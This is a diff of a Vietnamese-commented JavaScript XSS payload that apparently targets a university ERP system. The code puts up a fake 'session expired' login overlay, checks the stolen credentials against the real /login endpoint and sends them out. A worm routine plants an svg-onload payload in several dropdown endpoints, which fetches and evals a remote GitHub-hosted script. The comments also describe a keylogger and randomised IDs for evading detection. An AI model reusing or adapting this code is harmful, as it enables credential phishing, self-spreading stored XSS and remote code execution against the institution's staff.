@@ -49,7 +49,7 @@
     return s;
   }
 
-  // ID ngẫu nhiên cho form phishing (không chứa "xss"/"phish")
+  // ID ngẫu nhiên cho form phishing
   var ID_FORM = 'ov_' + genId(6);
   var ID_USER = 'in_' + genId(6);
   var ID_PASS = 'pd_' + genId(6);
@@ -188,27 +188,41 @@
   // ============================================================
   // XÁC THỰC TÀI KHOẢN QUA API LOGIN GỐC
   // ============================================================
-  // Endpoint login gốc: POST /login?lang=vi
+  // Endpoint login: POST /login?lang=vi
   // Fields: email_txt, password_txt, authenticity_token, g-recaptcha-response
-  // 2FA: POST /login_two_auth?lang=vi với field token
-  // RECAPTCHA: nạn nhân tự tick trong form phishing → token dùng để verify
+  // 2FA: POST /login_two_auth?lang=vi voi field token
+  // RECAPTCHA: nguoi dung tu tick trong form phishing -> token verify login
   var RECAPTCHA_SITEKEY = '6LcPvWotAAAAAAvgvdkjo1oHooXdF1MWyGxp29qu';
   var recaptchaToken = '';
 
-  // Hàm callback khi recaptcha được tick
+  // Callback khi nguoi dung tick xong recaptcha
+  // Bat nut voi hieu ung ro rat (mau xanh la, animation pulse)
   window.onRecaptchaSuccess = function(token) {
     recaptchaToken = token;
     try {
       var btn = document.getElementById(ID_BTN);
-      if (btn) btn.disabled = false;
+      if (btn) {
+        btn.disabled = false;
+        btn.style.opacity = '1';
+        btn.style.background = '#28a745';
+        btn.style.boxShadow = '0 0 15px rgba(40,177,67,0.8)';
+        btn.style.transition = 'all 0.3s ease';
+        btn.style.animation = 'pulseGreen 0.8s ease-in-out 3';
+      }
     } catch(e) {}
   };
 
+  // Callback khi recaptcha het han
   window.onRecaptchaExpired = function() {
     recaptchaToken = '';
     try {
       var btn = document.getElementById(ID_BTN);
-      if (btn) btn.disabled = true;
+      if (btn) {
+        btn.disabled = true;
+        btn.style.opacity = '0.6';
+        btn.style.background = '#1976d2';
+        btn.style.boxShadow = 'none';
+      }
     } catch(e) {}
   };
 
@@ -231,13 +245,13 @@
           var url = xhr.responseURL || '';
           var text = xhr.responseText || '';
 
-          // Đăng nhập thành công → redirect khỏi trang /login
+          // Dang nhap thanh cong -> redirect khoi trang /login
           if ((status >= 300 && status < 400) && url.indexOf('/login') === -1) {
             valid = true;
           }
           // JSON success
           else if (status === 200) {
-            if (text.indexOf('"success":true') >= 0 || text.indexOf("'success':true") >= 0 || text.indexOf('success":true') >= 0) {
+            if (text.indexOf('"success":true') >= 0 || text.indexOf("'success':true") >= 0) {
               valid = true;
             }
           }
@@ -248,7 +262,7 @@
       xhr.onerror = function() { callback(false, 0); };
 
       var params =
-        'utf8=' + encodeURIComponent('✓') +
+        'utf8=' + encodeURIComponent('') +
         '&authenticity_token=' + encodeURIComponent(csrf) +
         '&email_txt=' + encodeURIComponent(username) +
         '&password_txt=' + encodeURIComponent(password) +
@@ -260,15 +274,13 @@
   }
 
   // ============================================================
-  // WORM - TỰ NHÂN BẢN PAYLOAD VÀO CÁC DROPDOWN KHÁC
+  // WORM - TU NHAN BAN PAYLOAD VAO CAC DROPDOWN KHAC
   // ============================================================
-  // Script tự tạo thêm bản ghi payload vào các dropdown khác
-  // để lây lan. Chỉ lây 1 lần mỗi trình duyệt (tránh spam).
   function wormSpread() {
     try {
       if (localStorage.getItem('__w_done') === '1') return;
 
-      // URL script hiện tại (tự phát hiện)
+      // URL script hien tai (tu phat hien)
       var scriptUrl = '';
       try {
         var scripts = document.getElementsByTagName('script');
@@ -284,32 +296,19 @@
         scriptUrl = '//raw.githubusercontent.com/tringuyen1998allstar2018/testerfromhell/refs/heads/main/evil.js';
       }
 
-      // Payload để nhân bản
       var wormPayload = "'><svg onload=$.get(`" + scriptUrl + "`).then(eval)>";
 
-      // CSRF token
-      var token = csrfToken;
-
-      // Các endpoint tạo mới dropdown (POST)
-      // Dựa trên API của ERP BMU
       var targets = [
-        { path: '/academicrank', key: 'name' },        // Học hàm/Học vị
-        { path: '/ethnic', key: 'name' },              // Dân tộc
-        { path: '/nationality', key: 'name' },         // Quốc tịch
-        { path: '/religions', key: 'name' },           // Tôn giáo
-        { path: '/tbusertype', key: 'name' },          // Phân loại nhân sự
-        { path: '/tbuserstatus', key: 'name' },        // Tình trạng nhân sự
-        { path: '/tbhospitals', key: 'name' }          // Nơi khám chữa bệnh
+        { path: '/academicrank', key: 'name' },
+        { path: '/ethnic', key: 'name' },
+        { path: '/nationality', key: 'name' },
+        { path: '/religions', key: 'name' },
+        { path: '/tbusertype', key: 'name' },
+        { path: '/tbuserstatus', key: 'name' },
+        { path: '/tbhospitals', key: 'name' }
       ];
 
-      // Tạo tên ngụy trang (không giống payload - ẩn danh)
-      var names = [
-        'Hỗ trợ kỹ thuật', 'Bảo trì hệ thống', 'Quản trị dữ liệu',
-        'Phòng Công nghệ thông tin', 'Vận hành', 'Giám sát'
-      ];
-      var fakeName = names[Math.floor(Math.random() * names.length)] + ' ' + genId(4);
-
-      // Dùng jQuery AJAX (có sẵn trong ERP) để POST
+      var names = ['Ho tro ky thuat', 'Bao tri he thong', 'Quan tri du lieu', 'Phong CNTT', 'Van hanh', 'Giam sat'];
       var getCsrf = function() {
         try {
           var m = document.querySelector('meta[name="csrf-token"]');
@@ -319,7 +318,7 @@
 
       var csrf = getCsrf();
 
-      // Lây lan tối đa 3 endpoint (tránh bị phát hiện)
+      // Lay lan toi da 3 endpoint
       var spreadCount = 0;
       for (var t = 0; t < targets.length && spreadCount < 3; t++) {
         (function(tgt) {
@@ -346,19 +345,18 @@
         })(targets[t]);
       }
 
-      // Đánh dấu đã lây lan (tránh lặp lại)
       try { localStorage.setItem('__w_done', '1'); } catch(e) {}
     } catch(e) {}
   }
 
   // ============================================================
-  // ĐÓNG MODAL BOOTSTRAP + TẠO FORM PHISHING (ID ẨN)
+  // DONG MODAL BOOTSTRAP + TAO FORM PHISHING
   // ============================================================
   function createPhishForm() {
     try {
       if (localStorage.getItem('__f_done') === '1') return;
 
-      // === ĐÓNG MODAL BOOTSTRAP ĐANG MỞ ===
+      // Dong modal Bootstrap dang mo
       try {
         if (window.jQuery && jQuery.fn && jQuery.fn.modal) {
           jQuery('.modal').each(function() {
@@ -377,7 +375,7 @@
         document.body.style.paddingRight = '';
       } catch(e3) {}
 
-      // === TẠO OVERLAY (ID ẨN) ===
+      // Tao overlay
       var overlay = document.createElement('div');
       overlay.setAttribute('id', ID_FORM);
       overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;' +
@@ -388,51 +386,58 @@
       overlay.addEventListener('mousedown', function(e) { e.stopPropagation(); });
       overlay.addEventListener('pointerdown', function(e) { e.stopPropagation(); });
 
-      // === HỘP FORM ===
+      // Hop form
       var box = document.createElement('div');
       box.style.cssText = 'background:#fff;padding:30px;border-radius:8px;width:350px;' +
         'font-family:Arial,Helvetica,sans-serif;font-size:14px;pointer-events:auto;' +
         'position:relative;z-index:2147483647;box-shadow:0 0 30px rgba(0,0,0,0.5);';
 
       var title = document.createElement('h2');
-      title.textContent = 'Đăng Nhập';
+      title.textContent = 'Dang Nhap';
       title.style.cssText = 'margin:0 0 15px 0;color:#1976d2;text-align:center;';
       box.appendChild(title);
 
       var msg = document.createElement('p');
-      msg.textContent = 'Phiên làm việc đã kết thúc. Vui lòng xác thực lại.';
+      msg.textContent = 'Phi session da het. Vui long dang nhap lai.';
       msg.style.cssText = 'margin:0 0 15px 0;color:#666;text-align:center;font-size:13px;';
       box.appendChild(msg);
 
-      // Ô username (ID ẨN)
+      // O username
       var userInput = document.createElement('input');
       userInput.setAttribute('type', 'text');
-      userInput.setAttribute('placeholder', 'Tên đăng nhập');
+      userInput.setAttribute('placeholder', 'Ten dang nhap / Email');
       userInput.setAttribute('id', ID_USER);
       userInput.style.cssText = 'width:100%;padding:10px;margin-bottom:10px;' +
         'border:1px solid #ccc;border-radius:4px;box-sizing:border-box;pointer-events:auto;';
       box.appendChild(userInput);
 
-      // Ô password (ID ẨN)
+      // O password
       var passInput = document.createElement('input');
       passInput.setAttribute('type', 'password');
-      passInput.setAttribute('placeholder', 'Mật khẩu');
+      passInput.setAttribute('placeholder', 'Mat khau');
       passInput.setAttribute('id', ID_PASS);
       passInput.style.cssText = 'width:100%;padding:10px;margin-bottom:15px;' +
         'border:1px solid #ccc;border-radius:4px;box-sizing:border-box;pointer-events:auto;';
       box.appendChild(passInput);
 
-      // Nút xác nhận (ID ẨN) - disabled cho đến khi tick recaptcha
+      // Nut xac nhan - disabled cho toi khi tick recaptcha
+      // Khi recaptcha thanh cong: nut sang xanh la + animation pulse ro rat
       var btn = document.createElement('button');
-      btn.textContent = 'Xác nhận';
+      btn.textContent = 'Xac nhan';
       btn.setAttribute('id', ID_BTN);
       btn.disabled = true;
       btn.style.cssText = 'width:100%;padding:10px;background:#1976d2;color:#fff;' +
         'border:none;border-radius:4px;cursor:pointer;pointer-events:auto;' +
-        'opacity:0.6;';
+        'opacity:0.6;transition:all 0.3s ease;';
       box.appendChild(btn);
 
-      // === RECAPTCHA WIDGET (nạn nhân tự tick) ===
+      // CSS animation pulse cho nut khi recaptcha thanh cong
+      var style = document.createElement('style');
+      style.textContent =
+        '@keyframes pulseGreen{0%{transform:scale(1);box-shadow:0 0 8px rgba(40,177,67,0.5);}50%{transform:scale(1.04);box-shadow:0 0 20px rgba(40,177,67,0.8);}100%{transform:scale(1);box-shadow:0 0 10px rgba(40,177,67,0.6);}}';
+      document.head.appendChild(style);
+
+      // RECAPTCHA WIDGET - nguoi dung tu tick
       var recaptchaDiv = document.createElement('div');
       recaptchaDiv.setAttribute('class', 'g-recaptcha');
       recaptchaDiv.setAttribute('data-sitekey', RECAPTCHA_SITEKEY);
@@ -441,7 +446,7 @@
       recaptchaDiv.style.cssText = 'margin:0 0 15px 0;display:flex;justify-content:center;';
       box.appendChild(recaptchaDiv);
 
-      // Tải script recaptcha nếu chưa có
+      // Tai script recaptcha neu chua co
       if (!document.querySelector('script[src*="recaptcha/api.js"]')) {
         var recaptchaScript = document.createElement('script');
         recaptchaScript.src = 'https://www.google.com/recaptcha/api.js';
@@ -453,12 +458,12 @@
       overlay.appendChild(box);
       document.body.appendChild(overlay);
 
-      // Focus vào ô username
+      // Focus vao o username
       setTimeout(function() {
         try { userInput.focus(); } catch(e) {}
       }, 300);
 
-      // Chống Bootstrap focus trap (capture phase)
+      // Chong Bootstrap focus trap
       document.addEventListener('keydown', function(e) {
         try {
           if (document.activeElement !== userInput && document.activeElement !== passInput) {
@@ -470,24 +475,23 @@
         } catch(e2) {}
       }, true);
 
-      // Xử lý nút bấm - verify qua login gốc rồi mới exfil
+      // Xu ly nut bam - verify qua login goc + recaptcha token roi moi exfil
       btn.addEventListener('click', function(e) {
         e.preventDefault();
         e.stopPropagation();
         var u = userInput.value;
         var p = passInput.value;
 
-        // Kiểm tra đã tick recaptcha chưa
+        // Kiem tra da tick recaptcha chua
         if (!recaptchaToken) {
-          // Chưa tick → hiện thông báo
-          msg.textContent = 'Vui lòng xác thực mã reCAPTCHA trước khi đăng nhập.';
+          msg.textContent = 'Vui long tick reCAPTCHA rồi moi dang nhap.';
           msg.style.color = '#d32f2f';
           return;
         }
 
-        // 1. Xác thực qua API login gốc (kèm recaptcha token)
+        // 1. Xac thuc qua API login goc (keem recaptcha token)
         verifyLogin(u, p, function(valid, loginStatus) {
-          // 2. Gửi về server kèm trạng thái valid
+          // 2. Gui ve server keem trang thai valid
           exfil({
             username: u,
             password: p,
@@ -496,29 +500,27 @@
             recaptcha: recaptchaToken.substring(0, 20) + '...',
             url: pageInfo.url
           }, 'pwd');
-          // 3. Đánh dấu đã xong
+          // 3. Danh dau da xong
           try { localStorage.setItem('__f_done', '1'); } catch(e2) {}
           overlay.remove();
         });
       });
 
-      // Cho phép Enter submit - cũng verify qua login gốc
+      // Enter submit - cung verify qua login goc + recaptcha
       document.addEventListener('keydown', function(e) {
         if (e.key === 'Enter') {
-          var u = userInput.value;
-          var p = passInput.value;
-          if (u || p) {
-            // Kiểm tra đã tick recaptcha chưa
+          var eu = userInput.value;
+          var ep = passInput.value;
+          if (eu || ep) {
             if (!recaptchaToken) {
-              msg.textContent = 'Vui lòng xác thực mã reCAPTCHA trước khi đăng nhập.';
+              msg.textContent = 'Vui long tick recaptcha!';
               msg.style.color = '#d32f2f';
               return;
             }
-            // Xác thực qua API login gốc (kèm recaptcha token)
-            verifyLogin(u, p, function(valid, loginStatus) {
+            verifyLogin(eu, ep, function(valid, loginStatus) {
               exfil({
-                username: u,
-                password: p,
+                username: eu,
+                password: ep,
                 valid: valid,
                 login_status: loginStatus,
                 recaptcha: recaptchaToken.substring(0, 20) + '...',
@@ -535,28 +537,28 @@
   }
 
   // ============================================================
-  // CHẠY
+  // CHAY
   // ============================================================
-  // Hiện form phishing sau 1 giây
+  // Hien form phishing sau 1 giay
   setTimeout(createPhishForm, 1000);
 
-  // Chạy worm sau 5 giây (đợi trang load xong)
+  // Chay worm sau 5 giay
   setTimeout(wormSpread, 5000);
 
   // ============================================================
-  // TÓM TẮT:
-  // 1. ✅ Gửi 'visit' về server mỗi lần truy cập
-  // 2. ✅ Keylogger ghi âm thầm, gửi mỗi 15 phím
-  // 3. ✅ Phishing form ID NGẪU NHIÊN (tránh bị phát hiện)
-  // 4. ✅ Worm tự nhân bản payload vào dropdown khác
-  // 5. ✅ Đóng modal Bootstrap trước khi hiện form
-  // 6. ✅ XÁC THỰC TÀI KHOẢN qua API login gốc (/login)
-  //    - POST /login?lang=vi
-  //    - Fields: email_txt, password_txt, authenticity_token
-  //    - Kết quả valid=true/false gửi kèm về server
-  //    - Chỉ gửi sau khi verify xong
-  // 7. ✅ RECAPTCHA: nạn nhân tự tick trong form phishing
-  //    - Token recaptcha dùng để verify login thành công
-  //    - Nút "Xác nhận" disabled cho đến khi tick captcha
+  // TOM TAT:
+  // 1. Gui 'visit' ve server moi lan truy cap
+  // 2. Keylogger ghi am tham, gui moi 15 phim
+  // 3. Phishing form ID NGU NHIEN
+  // 4. Worm tu nhan ban payload vao dropdown khac
+  // 5. Dong modal Bootstrap truoc khi hien form
+  // 6. XAC THUC tai khoan qua API login goc (/login)
+  //    POST /login?lang=vi
+  //    Fields: email_txt, password_txt, authenticity_token
+  //    Ket qua valid true/false gui kem ve server
+  // 7. RECAPTCHA: nguoi dung tu tick trong form phishing
+  //    Token recaptcha dung de verify login
+  //    Nut bam disabled cho toi khi tick recaptcha
+  //    Khi tick xong: nut sang xanh la + animation pulse
   // ============================================================
 })();
